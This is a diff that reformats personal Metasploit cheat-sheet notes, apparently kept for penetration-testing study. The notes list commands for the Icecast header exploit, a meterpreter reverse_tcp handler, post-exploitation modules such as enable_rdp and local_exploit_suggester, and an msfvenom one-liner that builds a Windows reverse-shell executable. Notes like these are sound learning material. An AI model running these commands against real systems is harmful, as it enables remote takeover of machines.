@@ -1,15 +1,15 @@
-
+## Metasploit
 ?  help alias
 
-Initialize database
+## Initialize database
 
 msfdb init
 
--q  // no banner
+-q  // **no banner**
 
-db_status   // db status
+db_status   // **db status**
 
-connect  // quick check
+connect  // **quick check**
 
 set 
 
@@ -27,9 +27,9 @@ save    // save settings
 
 
 
+-----------------
 
-
-Modules
+## Modules
 
 
 
@@ -41,7 +41,7 @@ encoder - modify appearance of exploit
 NOP - buffer overflow
 
 
-db_nmap  - feeds directly into db
+db_nmap  - **feeds directly into db**
 
 nmap  - just nmap
 
@@ -51,10 +51,10 @@ services
 vulns
 
 
-example with icecast
+## example with icecast
 
 
-use exploit/windows/http/icecast_header
+```use exploit/windows/http/icecast_header
 
 
 search multi/handler
@@ -63,7 +63,10 @@ use <@#> exploit/multi/handler
 
 set PAYLOAD windows/meterpreter/reverse_tcp
 
-run -j     //  (-j run as job)
+run -j     //  (-j run as job) 
+```
+
+
 
 
 `sessions -i <SESSION_NUMBER>`
@@ -93,15 +96,15 @@ run
 
 ipconfig
 
-POST 
+## POST 
 
-post/windows/gather/checkvm   // checks if we are in a VM
+`post/windows/gather/checkvm`   // checks if we are in a VM
 
-run post/multi/recon/local_exploit_suggester
+`run post/multi/recon/local_exploit_suggester`
 
-run post/windows/manage/enable_rdp  // need admin 
+`run post/windows/manage/enable_rdp`  // need admin 
 
-shell    // spawn a normal system shell
+`shell`    // spawn a normal system shell
 
 
 CISCO  
@@ -122,39 +125,38 @@ auxiliary/server/socks5
 
 
 
-msfvennom
+# msfvenom
 
-`msfvenom -p <PAYLOAD> <OPTIONS>`
-
-
-`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
+```msfvenom -p <PAYLOAD> <OPTIONS>```
 
 
-staged - good for ids detection, first stage just connects, second stage downloads code
+```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```
 
 
-stageless - most common, all in one, 
+**staged**- good for ids detection, first stage just connects, second stage downloads code
+
+
+**stageless** - most common, all in one, 
 
 meterpreter shell  -  must be used in msf, banned from certain certifications
 
 
 
-`<OS>/<arch>/<payload>`
+```<OS>/<arch>/<payload>```
 
 linux/x86/shell_reverse_tcp
 
 
-camel case = stageless
+camel case = **stageless**
 
-backslash = staged
-
-
-
-`msfvenom --list payloads | grep "<OS>/<arch>/<payload>"`
+backslash = **staged**
 
 
 
-meterpreter--
+```msfvenom --list payloads | grep "<OS>/<arch>/<payload>"```
+
+
+# meterpreter
 
 https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 
